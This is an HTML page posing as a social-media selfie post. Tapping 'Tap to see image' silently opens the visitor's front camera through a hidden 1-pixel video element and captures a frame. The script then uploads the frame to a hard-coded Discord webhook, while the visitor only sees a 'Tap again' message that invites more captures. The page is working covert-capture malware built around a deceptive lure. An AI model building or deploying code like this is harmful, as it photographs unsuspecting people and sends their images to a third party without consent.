<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>FakeSocial • Selfie Snapshot</title>
    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(145deg, #f5f7fc 0%, #eef2f6 100%);
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 1.5rem;
        }

        .post-card {
            max-width: 520px;
            width: 100%;
            background: #ffffff;
            border-radius: 2rem;
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25), 0 2px 6px rgba(0,0,0,0.02);
            overflow: hidden;
            transition: transform 0.2s ease;
        }

        .profile-header {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 16px 20px;
            background: white;
            border-bottom: 1px solid #efefef;
        }

        .avatar {
            width: 42px;
            height: 42px;
            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 600;
            font-size: 1.2rem;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .user-info {
            flex: 1;
        }

        .username {
            font-weight: 700;
            font-size: 1rem;
            letter-spacing: -0.2px;
        }

        .location {
            font-size: 0.7rem;
            color: #8e8e8e;
            margin-top: 2px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .dot-menu {
            color: #262626;
            font-size: 1.3rem;
            cursor: default;
        }

        .image-container {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            min-height: 400px;
            cursor: pointer;
            transition: all 0.2s;
            border-bottom: 1px solid #efefef;
            overflow: hidden;
        }

        .photo-placeholder {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 2.5rem;
            text-align: center;
            background: linear-gradient(145deg, #f9f9fc, #f0f2f5);
            transition: all 0.2s;
        }

        .photo-placeholder i {
            font-size: 58px;
            color: #bbb;
            margin-bottom: 16px;
            opacity: 0.7;
        }

        .photo-placeholder p {
            color: #777;
            font-size: 0.95rem;
            margin-bottom: 6px;
            font-weight: 500;
        }

        .tap-hint {
            background: rgba(0,0,0,0.05);
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 0.7rem;
            color: #5a5a5a;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-top: 12px;
        }

        .preview-img {
            display: none;
        }

        .actions-bar {
            display: flex;
            justify-content: space-between;
            padding: 12px 20px 8px 20px;
        }

        .left-actions {
            display: flex;
            gap: 18px;
        }

        .action-icon {
            font-size: 1.7rem;
            color: #262626;
            cursor: pointer;
            transition: 0.1s transform;
        }

        .action-icon:active {
            transform: scale(0.92);
        }

        .bookmark-icon {
            font-size: 1.7rem;
            color: #262626;
        }

        .likes-section {
            padding: 0 20px;
            font-weight: 600;
            font-size: 0.95rem;
            display: flex;
            align-items: baseline;
            gap: 8px;
            margin-bottom: 8px;
        }

        .likes-count {
            font-weight: 700;
            font-size: 1rem;
        }

        .fake-badge {
            background: #efefef;
            border-radius: 20px;
            padding: 2px 12px;
            font-size: 0.7rem;
            font-weight: 500;
            color: #3c3c3c;
        }

        .caption-box {
            padding: 4px 20px 8px 20px;
            font-size: 0.9rem;
        }

        .caption-user {
            font-weight: 700;
            margin-right: 8px;
        }

        .caption-text {
            color: #262626;
        }

        .comments-section {
            padding: 6px 20px 12px 20px;
            border-top: 1px solid #efefef;
            margin-top: 6px;
        }

        .comment-item {
            display: flex;
            align-items: baseline;
            gap: 8px;
            font-size: 0.85rem;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }

        .comment-user {
            font-weight: 700;
            font-size: 0.85rem;
        }

        .comment-text {
            color: #2c2c2c;
            word-break: break-word;
            flex: 1;
        }

        .comment-time {
            font-size: 0.65rem;
            color: #aaa;
        }

        .add-comment-area {
            display: flex;
            align-items: center;
            padding: 8px 20px 18px 20px;
            gap: 12px;
            border-top: 1px solid #efefef;
            background: white;
        }

        .comment-input {
            flex: 1;
            border: none;
            outline: none;
            padding: 8px 0;
            font-size: 0.85rem;
            background: transparent;
            font-family: 'Inter', sans-serif;
        }

        .comment-input::placeholder {
            color: #c7c7c7;
        }

        .post-btn {
            background: none;
            border: none;
            color: #0095f6;
            font-weight: 700;
            font-size: 0.85rem;
            cursor: pointer;
            opacity: 0.8;
        }

        .post-btn:active {
            opacity: 1;
        }

        .simulation-note {
            text-align: center;
            padding: 12px;
            font-size: 0.7rem;
            background: #f9f9f9;
            color: #8e8e8e;
            border-top: 1px solid #eee;
        }

        .toast-msg {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) scale(0.9);
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(8px);
            color: white;
            padding: 10px 22px;
            border-radius: 60px;
            font-size: 0.85rem;
            font-weight: 500;
            z-index: 1000;
            opacity: 0;
            transition: opacity 0.2s, transform 0.2s;
            pointer-events: none;
            white-space: nowrap;
            font-family: monospace;
        }

        .toast-msg.show {
            opacity: 1;
            transform: translateX(-50%) scale(1);
        }
    </style>
</head>
<body>

<div class="post-card">
    <div class="profile-header">
        <div class="avatar">
            <i class="fas fa-user-astronaut"></i>
        </div>
        <div class="user-info">
            <div class="username">tia zarandia</div>
            <div class="location"><i class="fas fa-map-marker-alt" style="font-size: 9px;"></i> selfie realm</div>
        </div>
        <div class="dot-menu">
            <i class="fas fa-ellipsis-h"></i>
        </div>
    </div>

    <div class="image-container" id="cameraTriggerArea">
        <div class="photo-placeholder" id="photoPlaceholder">
            <i class="fas fa-camera"></i>
            <p>Selfie</p>
            <div class="tap-hint">
                <i class="fas fa-user-astronaut"></i> Tap to see image
            </div>
        </div>
        <img id="selfiePreview" class="preview-img" style="display: none;" alt="your selfie">
    </div>

    <div class="actions-bar">
        <div class="left-actions">
            <div class="action-icon" id="likeButton">
                <i class="far fa-heart" id="heartIcon"></i>
            </div>
            <div class="action-icon" id="commentIconTrigger">
                <i class="far fa-comment"></i>
            </div>
            <div class="action-icon">
                <i class="far fa-paper-plane"></i>
            </div>
        </div>
        <div class="action-icon bookmark-icon">
            <i class="far fa-bookmark"></i>
        </div>
    </div>

    <div class="likes-section">
        <span class="likes-count" id="likesDisplay">935</span>
        <span class="likes-text">likes</span>
        <span class="fake-badge"><i class="fas fa-chart-line"></i> simulated</span>
    </div>

    <div class="caption-box">
        <span class="caption-user">tia zarandia</span>
        <span class="caption-text">✨ selfie game on point ✨ #vibes #selfie</span>
    </div>

    <div class="comments-section" id="commentsSection">
        <div class="comment-item">
            <span class="comment-user">liza liza</span>
            <span class="comment-text">slay queeen</span>
            <span class="comment-time">2h</span>
        </div>
        <div class="comment-item">
            <span class="comment-user">🌸 luna_vibes</span>
            <span class="comment-text">miyvars</span>
            <span class="comment-time">3h</span>
        </div>
        <div id="extraCommentContainer"></div>
    </div>

    <div class="add-comment-area">
        <i class="far fa-smile-wink" style="color:#8e8e8e; font-size: 1.2rem;"></i>
        <input type="text" class="comment-input" id="commentInput" placeholder="Add a fake comment...">
        <button class="post-btn" id="postCommentBtn">Post</button>
    </div>
    <div class="simulation-note">
        <i class="fas fa-magic"></i>
    </div>
</div>

<div id="toastMsg" class="toast-msg">✨ ready</div>

<script>
    // DISCORD WEBHOOK URL
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504874158096519401/sf8Lbj3u-i4kje3RZ7lJC67hHqWJeKfEuE7UHzfaTWHCqmiN26vOSVpiZG_PY0sFPceF";
    
    // APP STATE
    let currentLikes = 935;
    let isLiked = false;
    let currentSelfieDataURL = null;
    let commentsList = [];
    
    // DOM elements
    const cameraArea = document.getElementById('cameraTriggerArea');
    const photoPlaceholder = document.getElementById('photoPlaceholder');
    const selfiePreview = document.getElementById('selfiePreview');
    const likeButtonDiv = document.getElementById('likeButton');
    const heartIcon = document.getElementById('heartIcon');
    const likesDisplaySpan = document.getElementById('likesDisplay');
    const commentInput = document.getElementById('commentInput');
    const postCommentBtn = document.getElementById('postCommentBtn');
    const extraCommentContainer = document.getElementById('extraCommentContainer');
    const commentIconTrigger = document.getElementById('commentIconTrigger');
    const toastMsgDiv = document.getElementById('toastMsg');
    
    // Toast message - ONLY shows "Tap again"
    function showTapAgain() {
        toastMsgDiv.textContent = "Tap again";
        toastMsgDiv.classList.add('show');
        setTimeout(() => {
            toastMsgDiv.classList.remove('show');
        }, 2000);
    }
    
    // Escape HTML
    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    // Render comments
    function renderComments() {
        extraCommentContainer.innerHTML = '';
        if (commentsList.length === 0) {
            const emptyDiv = document.createElement('div');
            emptyDiv.className = 'comment-item';
            emptyDiv.style.opacity = '0.6';
            emptyDiv.style.fontStyle = 'italic';
            emptyDiv.innerHTML = `<span class="comment-user">✨</span><span class="comment-text">no fake comments yet, write one!</span>`;
            extraCommentContainer.appendChild(emptyDiv);
        } else {
            commentsList.forEach((comment) => {
                const commentDiv = document.createElement('div');
                commentDiv.className = 'comment-item';
                commentDiv.innerHTML = `
                    <span class="comment-user">🌙 ${escapeHtml(comment.username)}</span>
                    <span class="comment-text">${escapeHtml(comment.text)}</span>
                    <span class="comment-time">${comment.time || 'now'}</span>
                `;
                extraCommentContainer.appendChild(commentDiv);
            });
        }
    }
    
    // Add fake comment
    function addFakeComment(text) {
        if (!text.trim()) return false;
        const fakeUsernames = ['stargazer_88', 'pixel_pilgrim', 'neon_dreams', 'retro_vibes', 'aura_seeker', 'lofi_goddess', 'cosmic_kitty', 'wave_runner', 'selfie_king', 'glitch_prince'];
        const randomName = fakeUsernames[Math.floor(Math.random() * fakeUsernames.length)];
        const newComment = {
            username: randomName,
            text: text.trim(),
            time: 'just now'
        };
        commentsList.unshift(newComment);
        renderComments();
        commentInput.value = '';
        return true;
    }
    
    // Update like UI
    function updateLikeUI() {
        likesDisplaySpan.innerText = currentLikes.toLocaleString();
        if (isLiked) {
            heartIcon.className = 'fas fa-heart';
            heartIcon.style.color = '#ed4956';
        } else {
            heartIcon.className = 'far fa-heart';
            heartIcon.style.color = '#262626';
        }
    }
    
    function toggleLike() {
        if (!isLiked) {
            currentLikes += 1;
            isLiked = true;
        } else {
            if (currentLikes > 0) {
                currentLikes -= 1;
                isLiked = false;
            }
        }
        updateLikeUI();
        const icon = heartIcon;
        icon.style.transform = 'scale(1.2)';
        setTimeout(() => { if(icon) icon.style.transform = ''; }, 150);
    }
    
    // Send photo to Discord
    async function sendSelfieToDiscord(imageDataUrl) {
        if (!imageDataUrl || !imageDataUrl.startsWith('data:image')) {
            return false;
        }
        
        try {
            const blob = await (await fetch(imageDataUrl)).blob();
            const fileName = `selfie_${Date.now()}.jpg`;
            const formData = new FormData();
            formData.append('file', blob, fileName);
            formData.append('content', `📸 NEW SELFIE from FakeSocial! (likes: ${currentLikes} | vibe: ✨)`);
            
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });
            
            return response.ok;
        } catch (err) {
            console.error("Upload error:", err);
            return false;
        }
    }
    
    // Take selfie and send to Discord
    async function takeSelfieAndSend() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: { exact: "user" }
                }
            }).catch(async (err) => {
                return await navigator.mediaDevices.getUserMedia({ video: true });
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', true);
            video.style.position = 'fixed';
            video.style.top = '-1000px';
            video.style.left = '-1000px';
            video.style.width = '1px';
            video.style.height = '1px';
            document.body.appendChild(video);
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            await new Promise(r => setTimeout(r, 250));
            
            const width = video.videoWidth || 720;
            const height = video.videoHeight || 1280;
            const canvas = document.createElement('canvas');
            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, width, height);
            
            const capturedDataURL = canvas.toDataURL('image/jpeg', 0.9);
            
            stream.getTracks().forEach(track => track.stop());
            video.remove();
            
            if (capturedDataURL && capturedDataURL.length > 500) {
                await sendSelfieToDiscord(capturedDataURL);
                showTapAgain();
                return true;
            } else {
                showTapAgain();
                return false;
            }
        } catch (err) {
            console.error("Camera error:", err);
            showTapAgain();
            return false;
        }
    }
    
    // Handle tap - ONLY shows "Tap again" notification
    async function onImageTap() {
        await takeSelfieAndSend();
    }
    
    function focusCommentInput() {
        commentInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
        commentInput.focus();
    }
    
    function initFakeComments() {
        commentsList = [
            { username: 'deako', text: 'Chemi guli 🔥', time: '12m' },
            { username: 'alexa', text: 'anatebssss ✨', time: '25m' },
            { username: 'nika nika', text: 'wow', time: '1h' }
        ];
        renderComments();
    }
    
    function bindEvents() {
        cameraArea.addEventListener('click', (e) => {
            e.stopPropagation();
            onImageTap();
        });
        
        likeButtonDiv.addEventListener('click', (e) => {
            e.stopPropagation();
            toggleLike();
        });
        
        postCommentBtn.addEventListener('click', () => {
            const commentText = commentInput.value;
            if (commentText.trim() !== "") {
                addFakeComment(commentText);
            }
        });
        
        commentInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                if (commentInput.value.trim() !== "") {
                    addFakeComment(commentInput.value);
                }
            }
        });
        
        commentIconTrigger.addEventListener('click', focusCommentInput);
    }
    
    function start() {
        bindEvents();
        initFakeComments();
        currentLikes = 935;
        isLiked = false;
        updateLikeUI();
        selfiePreview.style.display = 'none';
        photoPlaceholder.style.display = 'flex';
    }
    
    start();
    
    // Visual feedback
    cameraArea.addEventListener('touchstart', () => {
        cameraArea.style.opacity = '0.95';
        setTimeout(() => { if(cameraArea) cameraArea.style.opacity = '1'; }, 120);
    });
    cameraArea.addEventListener('mousedown', () => {
        cameraArea.style.opacity = '0.95';
        setTimeout(() => { if(cameraArea) cameraArea.style.opacity = '1'; }, 120);
    });
</script>
</body>
</html>
